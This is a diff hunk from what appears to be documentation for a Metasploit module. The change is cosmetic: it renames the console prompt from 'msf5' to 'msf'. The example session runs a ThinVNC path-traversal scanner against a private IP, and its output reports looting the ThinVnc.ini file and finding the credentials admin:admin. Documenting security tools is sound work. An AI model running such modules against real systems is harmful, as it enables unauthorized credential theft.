@@ -23,16 +23,16 @@
   ### ThinVNC version 1.0b1 on Windows XP SP3
 
   ```
-  msf5 > use auxiliary/scanner/http/thinvnc_traversal 
-  msf5 auxiliary(scanner/http/thinvnc_traversal) > set rhosts 172.16.123.123
+  msf > use auxiliary/scanner/http/thinvnc_traversal 
+  msf auxiliary(scanner/http/thinvnc_traversal) > set rhosts 172.16.123.123
   rhosts => 172.16.123.123
-  msf5 auxiliary(scanner/http/thinvnc_traversal) > run
+  msf auxiliary(scanner/http/thinvnc_traversal) > run
 
   [+] File ThinVnc.ini saved in: /root/.msf4/loot/20191017033828_default_172.16.123.123_thinvnc.traversa_713640.txt
   [+] Found credentials: admin:admin
   [*] Scanned 1 of 1 hosts (100% complete)
   [*] Auxiliary module execution completed
 
-  msf5 auxiliary(scanner/http/thinvnc_traversal) > 
+  msf auxiliary(scanner/http/thinvnc_traversal) > 
   ```
 
